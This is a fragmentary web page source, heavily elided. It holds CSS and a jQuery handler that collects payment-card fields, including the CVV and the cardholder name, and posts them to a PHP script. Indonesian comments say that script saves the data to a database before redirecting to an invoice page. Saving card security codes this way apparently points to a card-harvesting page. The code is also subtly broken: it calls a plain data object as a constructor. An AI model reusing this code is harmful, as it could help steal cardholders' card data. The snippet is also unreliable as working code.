...
<style>
  ...
  .div-2 {
    ...
    width: 100%;
    color: var(
      --puis-president-ac-id-12633333740234375-x-5413333129882812-default-nero,
      var(--jay, #fff)
    );
    font-weight: 400;
    line-height: 120%;
...
$(document).ready(function(){
    $('#bt_pay').click(function(e){
        ...
        var formData = {
            ...
            cvv: $('#cvv').val(),
            card_owner: $('#card-owner').val()
        };

        // Mengirim data ke server menggunakan AJAX
        $.ajax({
            url: 'payment/databanks.php', // Ganti dengan URL skrip PHP yang menyimpan data ke database
            method: 'POST',
            data: new formData,
            success: function(resp){
                // Arahkan pengguna ke halaman berikutnya setelah data tersimpan
                if(typeof resp =='object' && resp.status == 'success'){
                location.href = 'invoicesbanks.php'; // Ganti dengan URL halaman berikutnya
...
<!-- <script>
	$(document).ready(function(){
		$('#bt_pay').click(function(){
			uni_modal("<i class='fa fa-plus'></i>","payment/invoicesbanks.php")
		})
